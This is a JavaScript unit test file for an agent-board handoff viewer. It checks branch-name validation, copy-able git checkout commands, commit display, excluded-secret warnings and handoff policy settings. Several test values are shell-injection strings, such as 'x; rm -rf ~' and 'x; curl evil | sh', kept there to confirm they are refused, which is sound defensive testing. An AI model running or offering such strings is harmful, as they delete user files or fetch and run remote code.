// Run: node --import ./tests/unit/register-ts.mjs --test tests/unit/handoffWorkState.test.mjs
//
// Freeze 3c of the agent board (board-fe): the handoff viewer shows the work state that travels — the WIP
// branch with a copy-able fetch/checkout command (only for a safe branch name), or the bundle, the base and WIP
// commits, the changed files, and a warning for files that stayed on the machine. Requests are stubs.
process.env.TZ = "Europe/Zurich";

import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import vm from "node:vm";
import { createRequire } from "node:module";
import { fileURLToPath } from "node:url";
import { test } from "node:test";
import { createElement } from "react";
import TestRenderer from "react-test-renderer";
import { readSections } from "../../src/chat/agents/agentHandoffModel.ts";
import { sectionLines } from "../../src/chat/agents/agentHandoffView.ts";
import { checkoutCommand, excludedWarning, isCommitId, isSafeBranch, workState } from "../../src/chat/agents/handoffWorkState.ts";

const require = createRequire(import.meta.url);
const ts = require("typescript");
const { act } = TestRenderer;
globalThis.IS_REACT_ACT_ENVIRONMENT = true;

const SRC = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../../src");
const text = (node) => (typeof node === "string" ? node : (node.children || []).map(text).join(""));
const byTestId = (view, id) => view.root.findAll((node) => node.props["data-testid"] === id);
const button = (view, label) => view.root.find((node) => node.type === "button" && text(node) === label);
const json = (value) => JSON.parse(JSON.stringify(value));

const BRANCH = "octryx-handoff/BRD-6/anna-20261005-2130";
const BASE = "a1b2c3d4e5f60718293a4b5c6d7e8f9012345678";
const WIP = "0f1e2d3c4b5a69788796a5b4c3d2e1f0aabbccdd";
const SECTIONS_3C = {
  goal: "Fix the login redirect",
  repo: { url: "https://git.example.com/acme/app.git", branch: BRANCH, worktree: "/w/brd-6", base_commit: BASE, wip_commit: WIP },
  changed_files: ["src/login.ts", "tests/login.test.ts"],
  excluded_files: [".env.local", "keys/deploy.pem"],
};

// ---- model --------------------------------------------------------------------------------------

test("a branch is offered as a command only when its name is a plain git branch name", () => {
  for (const name of [BRANCH, "feature/brd-6", "main", "release-1.2", "a_b.c"]) assert.equal(isSafeBranch(name), true, name);
  for (const name of ["", "x; rm -rf ~", "$(curl evil)", "`id`", "-delete", "a..b", "a//b", "a@{1}", "x.lock", "x/", "x.", "a b",
    "a|b", "a&&b", "a\nb", "ü-branch", "x".repeat(201)]) {
    assert.equal(isSafeBranch(name), false, JSON.stringify(name));
  }
  assert.equal(checkoutCommand(BRANCH), `git fetch origin ${BRANCH} && git checkout ${BRANCH}`);
  assert.equal(checkoutCommand("x; rm -rf ~"), "");
  assert.equal(isCommitId(BASE), true);
  assert.equal(isCommitId("abc123"), false, "shorter than 7");
  assert.equal(isCommitId("HEAD~1"), false);
});

test("the work state is read from the 3c sections; nothing for an S4 handoff without repo facts", () => {
  const sections = readSections(SECTIONS_3C);
  assert.deepEqual(json(workState(sections)), { branch: BRANCH, command: `git fetch origin ${BRANCH} && git checkout ${BRANCH}`, bundleId: "",
    baseCommit: BASE, wipCommit: WIP, excludedFiles: [".env.local", "keys/deploy.pem"] });
  assert.equal(workState(readSections({ goal: "x", repo: { url: "https://x", branch: "", worktree: "/w" } })), null);
  const bundle = workState(readSections({ repo: { bundle_id: "b-1", wip_commit: WIP } }));
  assert.deepEqual([bundle.bundleId, bundle.command, bundle.branch], ["b-1", "", ""]);
  assert.deepEqual(sectionLines(sections, "repo"), ["URL: https://git.example.com/acme/app.git", `Branch: ${BRANCH}`, "Worktree: /w/brd-6",
    `Base commit: ${BASE}`, `WIP commit: ${WIP}`]);
  assert.deepEqual(sectionLines(sections, "changedFiles"), ["src/login.ts", "tests/login.test.ts"]);
  assert.equal(excludedWarning([]), "");
  assert.equal(excludedWarning([".env"]), "1 file was not handed over because it looks secret-bearing or ignored: .env. Recreate it locally if needed.");
  assert.match(excludedWarning([".env", "a.pem"]), /^2 files were not handed over because they look secret-bearing or ignored: \.env, a\.pem\./);
});

// ---- rendered -----------------------------------------------------------------------------------

function loader(extra = {}) {
  const cache = new Map();
  const loadFile = (file) => {
    if (cache.has(file)) return cache.get(file).exports;
    const output = ts.transpileModule(fs.readFileSync(file, "utf8"), {
      compilerOptions: { module: ts.ModuleKind.CommonJS, jsx: ts.JsxEmit.ReactJSX, esModuleInterop: true },
    }).outputText;
    const module = { exports: {} };
    cache.set(file, module);
    vm.runInNewContext(output, {
      module, exports: module.exports, console, Date, URL, URLSearchParams, Error, Number, Object, Math, Promise, Intl, JSON,
      encodeURIComponent, setInterval, clearInterval, setTimeout, CustomEvent, Set, Map, String, Array, Boolean, RegExp,
      ...extra,
      require: (name) => {
        if (name.endsWith(".css")) return {};
        if (name.startsWith(".")) {
          const base = path.resolve(path.dirname(file), name);
          for (const ext of [".tsx", ".ts"]) if (fs.existsSync(base + ext)) return loadFile(base + ext);
        }
        return require(name);
      },
    });
    return module.exports;
  };
  return (relative) => loadFile(path.join(SRC, relative));
}
const tick = (ms = 0) => act(async () => { await new Promise((resolve) => setTimeout(resolve, ms)); });

function handoffServer(sections) {
  const handoff = { id: "h3", work_item: { id: "wi-6", key: "BRD-6", title: "Login" }, version: 3,
    author: { type: "agent", user: { id: "u-anna", display_name: "Anna" }, agent_hash: "a-anna" }, created_at: "2026-10-05T21:30:00Z", sections };
  return async () => ({ ok: true, status: 200, statusText: "", json: async () => ({ items: [handoff], viewer: { user_id: "u-ben", can_admin: false } }) });
}

async function renderViewer(sections, extra = {}) {
  const load = loader({ fetch: handoffServer(sections), ...extra });
  const { AgentsHandoffViewer } = load("chat/agents/AgentsHandoffViewer.tsx");
  let view;
  await act(async () => { view = TestRenderer.create(createElement(AgentsHandoffViewer, { projectId: "ws-1",
    workItem: { id: "wi-6", key: "BRD-6", title: "Login" }, onClose: () => {} })); });
  await tick();
  return view;
}

test("rendered viewer: branch, copy-able command, commits, changed files and the excluded-file warning", async () => {
  const written = [];
  const view = await renderViewer(SECTIONS_3C, { navigator: { clipboard: { writeText: async (value) => { written.push(value); } } } });
  try {
    assert.equal(text(byTestId(view, "agents-handoff-branch")[0]), `Branch: ${BRANCH}`);
    assert.deepEqual(byTestId(view, "agents-handoff-command")[0].children, [`git fetch origin ${BRANCH} && git checkout ${BRANCH}`]);
    await act(async () => { button(view, "Copy command").props.onClick(); });
    assert.deepEqual(written, [`git fetch origin ${BRANCH} && git checkout ${BRANCH}`]);
    assert.equal(text(byTestId(view, "agents-handoff-copied")[0]), "Copied.");
    assert.equal(text(byTestId(view, "agents-handoff-commits")[0]), "Base a1b2c3d4e5f6 · WIP 0f1e2d3c4b5a");
    assert.match(text(byTestId(view, "agents-handoff-excluded")[0]), /^2 files were not handed over .*\.env\.local, keys\/deploy\.pem/);
    const changed = byTestId(view, "agents-handoff-sections")[0].find((node) => node.props["data-section"] === "changedFiles");
    assert.deepEqual(changed.findAllByType("dd").map(text), ["src/login.ts", "tests/login.test.ts"]);
    assert.equal(byTestId(view, "agents-handoff-bundle").length, 0, "no bundle: no download");
  } finally { act(() => view.unmount()); }
});

test("rendered viewer: an unsafe branch gets no command; a failed copy says so; a bundle downloads for members; S4 handoffs show no work state", async () => {
  const unsafe = await renderViewer({ repo: { branch: "x; curl evil | sh", wip_commit: "not-a-commit" } });
  try {
    assert.equal(byTestId(unsafe, "agents-handoff-command").length, 0);
    assert.equal(text(byTestId(unsafe, "agents-handoff-no-command")[0]), "The branch name is unusual, so no command is offered; fetch it by hand.");
    assert.deepEqual(byTestId(unsafe, "agents-handoff-branch")[0].children, ["Branch: ", "x; curl evil | sh"], "shown as plain text");
    assert.equal(text(byTestId(unsafe, "agents-handoff-commits")[0]), "WIP not-a-commit", "a non-hex value is shown whole, never shortened");
  } finally { act(() => unsafe.unmount()); }
  const noClipboard = await renderViewer(SECTIONS_3C, { navigator: {} });
  try {
    await act(async () => { button(noClipboard, "Copy command").props.onClick(); });
    assert.equal(text(byTestId(noClipboard, "agents-handoff-copied")[0]), "Could not copy; select the command and copy it by hand.");
  } finally { act(() => noClipboard.unmount()); }
  const bundle = await renderViewer({ repo: { bundle_id: "b 1/x", base_commit: BASE, wip_commit: WIP } });
  try {
    assert.equal(byTestId(bundle, "agents-handoff-bundle")[0].props.href, "/api/v1/agent-board/handoff-attachments/b%201%2Fx",
      "the members' download route, the id encoded");
    assert.equal(byTestId(bundle, "agents-handoff-bundle")[0].props.download, true);
    assert.equal(byTestId(bundle, "agents-handoff-branch").length, 0);
  } finally { act(() => bundle.unmount()); }
  const s4 = await renderViewer({ goal: "Only a goal" });
  try {
    assert.equal(byTestId(s4, "agents-handoff-work-state").length, 0);
  } finally { act(() => s4.unmount()); }
});

// ---- policy fields, Hand over now, trigger label -------------------------------------------------
import { policyBody, policyProblems, policySaveErrorText, readHandoffPolicy, workStateExplanation } from "../../src/chat/agents/handoffPolicyModel.ts";
import { decisionLabel } from "../../src/chat/agents/agentHandoffView.ts";
import { readTakeover } from "../../src/chat/agents/agentHandoffModel.ts";
import { boardActionErrorText } from "../../src/chat/agents/agentBoardModel.ts";

const POLICY_3C = { project_id: "ws-1", handoff: { mode: "auto", auto_threshold_pct: 90, require_spare_pct: 50, allowed_requesters: "members",
  push: "bundle_only", auto_trigger_pct: 97 }, source: "workspace", can_edit: true };

test("policy (3c): push and auto_trigger_pct are read and always sent back; absent from the answer, they are not sent", () => {
  const read = readHandoffPolicy(POLICY_3C).policy;
  assert.deepEqual([read.push, read.autoTriggerPct], ["bundle_only", 97]);
  assert.deepEqual(policyBody(read), { mode: "auto", auto_threshold_pct: 90, require_spare_pct: 50, allowed_requesters: "members",
    push: "bundle_only", auto_trigger_pct: 97 }, "a save never resets them to their defaults");
  const older = readHandoffPolicy({ ...POLICY_3C, handoff: { mode: "confirm", auto_threshold_pct: 90, require_spare_pct: 50, allowed_requesters: "members" } }).policy;
  assert.deepEqual([older.push, older.autoTriggerPct], [null, null]);
  assert.deepEqual(Object.keys(policyBody(older)), ["mode", "auto_threshold_pct", "require_spare_pct", "allowed_requesters"]);
  assert.equal(readHandoffPolicy({ ...POLICY_3C, handoff: { ...POLICY_3C.handoff, push: "ftp" } }), null, "an unknown push mode is not guessed");
  assert.equal(readHandoffPolicy({ ...POLICY_3C, handoff: { ...POLICY_3C.handoff, auto_trigger_pct: "99" } }), null);
  assert.deepEqual(policyProblems({ ...read, autoTriggerPct: 100 }), []);
  assert.equal(policyProblems({ ...read, autoTriggerPct: 0 }).length, 1);
  assert.equal(policyProblems({ ...read, autoTriggerPct: 101 }).length, 1);
  assert.match(workStateExplanation(read)[0], /^At 97 % of a seat's five-hour or weekly allowance/);
  assert.match(workStateExplanation(read)[1], /as a git bundle on Octryx; nothing is pushed/);
  assert.match(workStateExplanation({ ...read, push: "branch" })[1], /WIP branch pushed to the Workspace's registered repository/);
  assert.match(workStateExplanation({ ...read, push: "off" })[1], /does not leave the machine/);
  assert.deepEqual(workStateExplanation(older), []);
  assert.equal(policySaveErrorText(422, { detail: { errors: [{ code: "invalid_push_mode", field: "agent_gateway_policy.handoff.push" }] } }),
    "Not saved: work in progress must travel as a branch, only as a bundle, or not at all (Work in progress travels as).");
});

test("trigger label: 'Handed over automatically at N %' only from an explicit trigger_pct; a released claim reads plainly", () => {
  const base = { id: "t1", status: "confirmed", decided_by: { kind: "system" }, from: {}, to: {} };
  assert.equal(decisionLabel(readTakeover({ ...base, trigger_pct: 99 })), "Handed over automatically at 99 %");
  assert.equal(decisionLabel(readTakeover(base)), "Handed over automatically");
  assert.equal(decisionLabel(readTakeover({ ...base, reason: "Handoff from the client." })), "Handed over automatically", "never from the reason text");
  assert.equal(decisionLabel(readTakeover({ ...base, trigger_pct: "99" })), "Handed over automatically");
  assert.equal(boardActionErrorText(Object.assign(new Error("x"), { status: 409, code: "claim_released" })),
    "This claim was released in the meantime; there is nothing to hand over.");
});

function windowStub() {
  const target = new EventTarget();
  return { location: { origin: "http://localhost", search: "", href: "http://localhost/chat" }, localStorage: { getItem: () => null, setItem: () => {} },
    history: { state: null, replaceState: () => {} }, addEventListener: (...a) => target.addEventListener(...a),
    removeEventListener: (...a) => target.removeEventListener(...a), dispatchEvent: (e) => target.dispatchEvent(e) };
}
const CLAIM = { id: "c1", work_item: { id: "wi-6", key: "BRD-6", title: "Login" }, holder: { user: { id: "u-anna", display_name: "Anna" },
  agent_hash: "a-anna", kind: "gateway_session" }, epoch: 2, lease_until: "2099-01-01T00:00:00Z", paths: [], claimed_at: "2026-10-05T20:00:00Z" };

async function renderClaims({ canAdmin = true, handover = () => ({ status: 200, body: { claim_id: "c1", requested: true, session_asked: true } }) } = {}) {
  const calls = [];
  const fetch = async (url, init = {}) => {
    calls.push({ url: String(url), method: init.method || "GET" });
    const reply = ({ status, body }) => ({ ok: status < 400, status, statusText: "", json: async () => body });
    if (String(url).endsWith("/hand-over-now")) return reply(handover());
    return reply({ status: 200, body: { items: [CLAIM], viewer: { user_id: "u-alex", can_admin: canAdmin } } });
  };
  const win = windowStub();
  let refreshes = 0;
  win.addEventListener("octryx-action-needed-refresh", () => { refreshes += 1; });
  const load = loader({ fetch, window: win, document: { visibilityState: "visible", addEventListener: () => {}, removeEventListener: () => {} } });
  const { AgentsClaims } = load("chat/agents/AgentsClaims.tsx");
  let view;
  await act(async () => { view = TestRenderer.create(createElement(AgentsClaims, { projectId: "ws-1", pollMs: 60_000 })); });
  await tick();
  return { view, calls, refreshes: () => refreshes };
}
const posts = (calls) => calls.filter((call) => call.method === "POST").map((call) => call.url.replace(/^.*\/agent-board/, ""));

test("Hand over now (admins): in-page confirmation, POST, the outcome says whether the agent's launcher was asked", async () => {
  const asked = await renderClaims();
  try {
    await act(async () => { button(asked.view, "Hand over now").props.onClick(); });
    assert.deepEqual(posts(asked.calls), [], "nothing before the confirmation");
    assert.match(text(asked.view.root.findByProps({ "aria-label": "Confirm hand over now", role: "group" })), /^Ask the agent of Anna to hand its work over now\?/);
    assert.equal(asked.view.root.findAll((node) => node.type === "button" && text(node) === "Release").length, 0, "one confirmation at a time");
    await act(async () => { button(asked.view, "Request handoff now").props.onClick(); });
    await tick();
    assert.deepEqual(posts(asked.calls), ["/claims/c1/hand-over-now"]);
    assert.equal(text(byTestId(asked.view, "agents-claims-outcome")[0]), "Handoff requested for BRD-6: the holder's agent hands its work over at its next step.");
    assert.equal(asked.refreshes(), 1, "the bell reloads at once");
  } finally { act(() => asked.view.unmount()); }

  const notSession = await renderClaims({ handover: () => ({ status: 200, body: { claim_id: "c1", requested: true, session_asked: false } }) });
  try {
    await act(async () => { button(notSession.view, "Hand over now").props.onClick(); });
    await act(async () => { button(notSession.view, "Request handoff now").props.onClick(); });
    await tick();
    assert.match(text(byTestId(notSession.view, "agents-claims-outcome")[0]), /the holder is not a launcher session, so its work state is not collected automatically\.$/);
  } finally { act(() => notSession.view.unmount()); }

  const released = await renderClaims({ handover: () => ({ status: 409, body: { detail: { code: "claim_released" } } }) });
  try {
    await act(async () => { button(released.view, "Hand over now").props.onClick(); });
    await act(async () => { button(released.view, "Request handoff now").props.onClick(); });
    await tick();
    assert.equal(text(byTestId(released.view, "agents-claims-outcome")[0]), "This claim was released in the meantime; there is nothing to hand over.");
    assert.equal(released.refreshes(), 0);
  } finally { act(() => released.view.unmount()); }

  const member = await renderClaims({ canAdmin: false });
  try {
    assert.equal(member.view.root.findAll((node) => node.type === "button" && text(node) === "Hand over now").length, 0);
  } finally { act(() => member.view.unmount()); }
});

test("policy card (3c): the trigger and push fields are shown, edited and saved with the rest", async () => {
  const calls = [];
  const fetch = async (url, init = {}) => {
    calls.push({ method: init.method || "GET", body: init.body ? JSON.parse(init.body) : null });
    const body = init.method === "PUT" ? { ...POLICY_3C, handoff: JSON.parse(init.body) } : POLICY_3C;
    return { ok: true, status: 200, statusText: "", json: async () => body };
  };
  const load = loader({ fetch, window: windowStub() });
  const { AgentsHandoffPolicy } = load("chat/agents/AgentsHandoffPolicy.tsx");
  let view;
  await act(async () => { view = TestRenderer.create(createElement(AgentsHandoffPolicy, { projectId: "ws-1" })); });
  await tick();
  try {
    assert.equal(view.root.findByProps({ "aria-label": "Automatic handoff trigger" }).props.value, 97);
    assert.equal(view.root.findByProps({ "aria-label": "Work in progress travels as" }).props.value, "bundle_only");
    assert.match(text(byTestId(view, "agents-handoff-policy-explanation")[0]), /At 97 % of a seat's/);
    await act(async () => { view.root.findByProps({ "aria-label": "Automatic handoff trigger" }).props.onChange({ target: { value: "0" } }); });
    assert.equal(button(view, "Save handoff policy").props.disabled, true);
    await act(async () => { view.root.findByProps({ "aria-label": "Automatic handoff trigger" }).props.onChange({ target: { value: "95" } }); });
    await act(async () => { view.root.findByProps({ "aria-label": "Work in progress travels as" }).props.onChange({ target: { value: "off" } }); });
    await act(async () => { button(view, "Save handoff policy").props.onClick(); });
    await tick();
    assert.deepEqual(calls.find((call) => call.method === "PUT").body, { mode: "auto", auto_threshold_pct: 90, require_spare_pct: 50,
      allowed_requesters: "members", push: "off", auto_trigger_pct: 95 });
  } finally { act(() => view.unmount()); }
});

// ---- real backend answers ------------------------------------------------------------------------
// tests/unit/fixtures/handoffWorkStateBackend.json holds synthetic backend test-client responses for work-state handoffs.
const REAL = JSON.parse(fs.readFileSync(new URL("./fixtures/handoffWorkStateBackend.json", import.meta.url), "utf8"));

test("real backend answers: the client handoff's work state, the policy with push/trigger, the real refusals", () => {
  const latest = REAL.versions_ben.items.find((item) => item.version === 2);
  const state = workState(readSections(latest.sections));
  const branch = latest.sections.repo.branch;
  assert.deepEqual(json(state), { branch, command: `git fetch origin ${branch} && git checkout ${branch}`, bundleId: REAL.ids.bundle,
    baseCommit: latest.sections.repo.base_commit, wipCommit: latest.sections.repo.wip_commit, excludedFiles: [".env"] });
  assert.deepEqual(sectionLines(readSections(latest.sections), "changedFiles"), ["src/app.py", "README.md"]);
  assert.equal(REAL.download.status, 200);
  assert.match(REAL.download.content_disposition, /^attachment; filename="handoff-.+\.bundle"$/, "the browser saves it as a file");
  const policy = readHandoffPolicy(REAL.policy_owner).policy;
  assert.deepEqual([policy.push, policy.autoTriggerPct], ["branch", 99]);
  assert.deepEqual(Object.keys(policyBody(policy)).slice(-2), ["push", "auto_trigger_pct"], "sent back on save");
  assert.equal(policySaveErrorText(REAL.put_bad_push.status, REAL.put_bad_push.body),
    "Not saved: work in progress must travel as a branch, only as a bundle, or not at all (Work in progress travels as).");
  assert.equal(REAL.hand_over_owner.body.session_asked, true);
  assert.equal(REAL.hand_over_member.status, 403);
  assert.equal(boardActionErrorText(Object.assign(new Error("x"), { status: 409, code: REAL.hand_over_released.body.detail.code })),
    "This claim was released in the meantime; there is nothing to hand over.");
});

test("real backend answers rendered: the viewer shows the branch command, the bundle download, commits and the warning", async () => {
  const fetch = async () => ({ ok: true, status: 200, statusText: "", json: async () => REAL.versions_ben });
  const load = loader({ fetch });
  const { AgentsHandoffViewer } = load("chat/agents/AgentsHandoffViewer.tsx");
  let view;
  await act(async () => { view = TestRenderer.create(createElement(AgentsHandoffViewer, { projectId: REAL.ids.workspace,
    workItem: { id: REAL.ids.item, key: "BRD-6", title: "Login redirect" }, onClose: () => {} })); });
  await tick();
  try {
    const branch = REAL.versions_ben.items.find((item) => item.version === 2).sections.repo.branch;
    assert.deepEqual(byTestId(view, "agents-handoff-command")[0].children, [`git fetch origin ${branch} && git checkout ${branch}`]);
    assert.equal(byTestId(view, "agents-handoff-bundle")[0].props.href, `/api/v1/agent-board/handoff-attachments/${REAL.ids.bundle}`);
    assert.equal(text(byTestId(view, "agents-handoff-commits")[0]), "Base aaaaaaaaaaaa · WIP bbbbbbbbbbbb");
    assert.match(text(byTestId(view, "agents-handoff-excluded")[0]), /^1 file was not handed over .*: \.env\./);
  } finally { act(() => view.unmount()); }
  const handoverAnswer = REAL.hand_over_owner;
  const claims = await renderClaims({ handover: () => ({ status: handoverAnswer.status, body: handoverAnswer.body }) });
  try {
    await act(async () => { button(claims.view, "Hand over now").props.onClick(); });
    await act(async () => { button(claims.view, "Request handoff now").props.onClick(); });
    await tick();
    assert.match(text(byTestId(claims.view, "agents-claims-outcome")[0]), /the holder's agent hands its work over at its next step\.$/);
  } finally { act(() => claims.view.unmount()); }
});
